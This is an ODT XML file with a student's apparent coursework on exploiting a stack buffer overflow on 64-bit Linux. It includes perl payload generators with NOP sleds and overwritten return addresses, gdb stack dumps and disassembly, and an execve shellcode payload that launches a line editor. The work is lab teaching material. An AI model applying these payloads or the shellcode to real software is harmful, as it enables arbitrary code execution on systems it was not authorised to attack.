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16622" officeooo:paragraph-rsid="00016622"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:rsid="00016622" officeooo:paragraph-rsid="00016622"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00016622" officeooo:paragraph-rsid="00016622" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="0002cf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2</text:p>
      <text:p text:style-name="P2">64bit <text:span text:style-name="T2">Linux </text:span>machine /<text:span text:style-name="T2">w intel</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">After you compile your program, run it inside a debugger and enter a long enough input resulting in program crash due to an overwritten return address. After the crash, the program stops in the debugger and the EIP register (resp. RIP for the 64-bit mode) will contain a portion of the input. Another portion of the input should be visible in EBP (resp. RBP). Draw the stack frame layout so it is evident where the buffer is allocated, where resides the return address, the input parameters, etc. (1 point) </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Input script : perl -e 'print "A"x16;'</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">0x7fffffffdd00:<text:tab/>0xffffde08<text:tab/>0x00007fff<text:tab/>0x00400490<text:tab/>0x00000001</text:p>
      <text:p text:style-name="P2">0x7fffffffdd10:<text:tab/>0x41414141<text:tab/>0x41414141<text:tab/>0x41414141<text:tab/>0x41414141</text:p>
      <text:p text:style-name="P2">0x7fffffffdd20:<text:tab/>0x00000000-<text:tab/>0x00000000-<text:tab/>0xf7a36ec5*<text:tab/>0x00007fff*</text:p>
      <text:p text:style-name="P2">* = return address, </text:p>
      <text:p text:style-name="P2">- = ebp</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Saved registers:</text:p>
      <text:p text:style-name="P2"><text:s text:c="2"/>rbp at 0x7fffffffdd20, rip at 0x7fffffffdd28</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">To make the program crash on return the input must be at least 25 bytes. </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Input script : perl -e 'print "A"x25;'</text:p>
      <text:p text:style-name="P2">x/12x $rsp</text:p>
      <text:p text:style-name="P2">0x7fffffffdd00:<text:tab/>0xffffde08<text:tab/>0x00007fff<text:tab/>0x00400490<text:tab/>0x00000001</text:p>
      <text:p text:style-name="P2">0x7fffffffdd10:<text:tab/>0x41414141<text:tab/>0x41414141<text:tab/>0x41414141<text:tab/>0x41414141</text:p>
      <text:p text:style-name="P2">0x7fffffffdd20:<text:tab/>0x41414141<text:tab/>0x41414141<text:tab/>0xf7a30041<text:tab/>0x00007fff</text:p>
      <text:p text:style-name="P2">This has overwritten one byte of the saved rip (return address). This will cause the program to crash in best case or may find executable code at the new address and continue executing. </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">A portion of the input that ended in EIP allows you to determine the address where the program attempted to return; if it was valid, the program would return to that address and the code present there would get executed. The easiest way to exploit this is, if at all possible, to return the control to a location on the stack located inside the buffer. The EIP on the stack will get overwritten with an address pointing somewhere inside the buffer. If you cannot point EIP precisely, write enough nop instructions (machine code 0x90) before the exploit code so that the execution slides by these nops and eventually reaches the exploit — this is a *nop sled* method. (2 points) </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Input script : perl -e 'print "\x90"x24 . "\x10\xdd\xff\xff" . "\xff\x7f";'</text:p>
      <text:p text:style-name="P2">x/12x $rsp</text:p>
      <text:p text:style-name="P2">0x7fffffffdd00:<text:tab/>0xffffde08<text:tab/>0x00007fff<text:tab/>0x00400490<text:tab/>0x00000001</text:p>
      <text:p text:style-name="P2">0x7fffffffdd10:<text:tab/>0x90909090<text:tab/>0x90909090<text:tab/>0x90909090<text:tab/>0x90909090&lt;--|</text:p>
      <text:p text:style-name="P2">0x7fffffffdd20:<text:tab/>0x90909090<text:tab/>0x90909090<text:tab/>0xffffdd10<text:tab/>0x00007fff&gt;--|</text:p>
      <text:p text:style-name="P2">Saved registers:</text:p>
      <text:p text:style-name="P2"><text:s text:c="2"/>rbp at 0x7fffffffdd20, rip at 0x7fffffffdd28</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">The saved rip (return address) is now pointing at 0x7fffffffdd10.</text:p>
      <text:p text:style-name="P2">There is NOP instructions from 0x7fffffffdd10 to 0x7fffffffdd28.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">x/5i $rip</text:p>
      <text:p text:style-name="P2">=&gt; 0x4005bd &lt;main+64&gt;:<text:tab/>mov <text:s text:c="3"/>eax,0x0</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x4005c2 &lt;main+69&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x4005c3 &lt;main+70&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x4005c4:<text:tab/>nop <text:s text:c="3"/>WORD PTR cs:[rax+rax*1+0x0]</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:s text:c="3"/>0x4005ce:<text:tab/>xchg <text:s text:c="2"/>ax,ax</text:p>
      <text:p text:style-name="P2">(gdb) nexti</text:p>
      <text:p text:style-name="P2">8<text:tab/>}</text:p>
      <text:p text:style-name="P2">(gdb) nexti</text:p>
      <text:p text:style-name="P2">0x00000000004005c3<text:tab/>8<text:tab/>}</text:p>
      <text:p text:style-name="P2">(gdb) nexti</text:p>
      <text:p text:style-name="P2">0x00007fffffffdd10 in ?? ()</text:p>
      <text:p text:style-name="P2">(gdb) x/5i $rip</text:p>
      <text:p text:style-name="P2">=&gt; 0x7fffffffdd10:<text:tab/>nop</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x7fffffffdd11:<text:tab/>nop</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x7fffffffdd12:<text:tab/>nop</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x7fffffffdd13:<text:tab/>nop</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x7fffffffdd14:<text:tab/>nop</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Note that the injected code does not pass through the dynamic loader so it is not possible to call system functions in the traditional way by using call exec. You can, however, use call eax (resp. call rax), where the eax register will point to an address of the desired function such as 0x12345678. If the address of the exec function were 0x12345678, it would be executed. You can set the address either by hard-coding it or by looking up another call in the program binary and copying the address. Find an address of a system function that you would use for your exploit and describe the way you went about it (2 points). </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Trying to run exit(1);</text:p>
      <text:p text:style-name="P2">With exitcode 4. </text:p>
      <text:p text:style-name="P2">exit() is located at 0x00007ffff7a51290</text:p>
      <text:p text:style-name="P2">This address was retrieved by:</text:p>
      <text:p text:style-name="P2">(gdb) disassemble exit</text:p>
      <text:p text:style-name="P2">Dump of assembler code for function __GI_exit:</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x00007ffff7a51290 &lt;+0&gt;:<text:tab/>lea <text:s text:c="3"/>rsi,[rip+0x382431] <text:s text:c="7"/># 0x7ffff7dd36c8 &lt;__exit_funcs&gt;</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x00007ffff7a51297 &lt;+7&gt;:<text:tab/>sub <text:s text:c="3"/>rsp,0x8</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x00007ffff7a5129b &lt;+11&gt;:<text:tab/>mov <text:s text:c="3"/>edx,0x1</text:p>
      <text:p text:style-name="P2"><text:s text:c="3"/>0x00007ffff7a512a0 &lt;+16&gt;:<text:tab/>call <text:s text:c="2"/>0x7ffff7a51180 &lt;__run_exit_handlers&gt;</text:p>
      <text:p text:style-name="P2">End of assembler dump.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">I was unable to succeed in calling the function. The generator script i used: </text:p>
      <text:p text:style-name="P2">perl -e 'print "\x90"x24 . "\xc0\xdd\xff\xff" . "\xff\x7f\x00\x00" . "\x90"x400 . "\x05\x8b\x48\x01" . "\x90\x12\xa5\xf7\xff\x7f\x00\x00"."\xbf\x04\x00\x00\x00\xff\xd0";' &gt; /tmp/input</text:p>
      <text:p text:style-name="P2">As mentioned, this was not successful. </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">D<text:span text:style-name="T1">esign an exploit that e.g. runs calc.exe or shows a message box. (3 points). You can get some inspiration from the Project Metasploit. </text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Inspiration from: https://github.com/emptymonkey/drinkme</text:p>
      <text:p text:style-name="P2">Executes Ed - The GNU line editor.</text:p>
      <text:p text:style-name="P2">perl -e 'print "\x90"x24 . "\xc0\xdd\xff\xff" . "\xff\x7f\x00\x00" . "\x90"x400 . "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x65\x64\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";' &gt; /tmp/inpu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6622" officeooo:paragraph-rsid="0001662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Gustaf Nilstadiu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2T03:39:40.150472196</dc:date>
    <meta:generator>LibreOffice/4.2.8.2$Linux_X86_64 LibreOffice_project/420m0$Build-2</meta:generator>
    <meta:editing-duration>P0D</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="66" meta:word-count="680" meta:character-count="4700" meta:non-whitespace-character-count="4005"/>
  </office:meta>
</office:document-meta>
</file>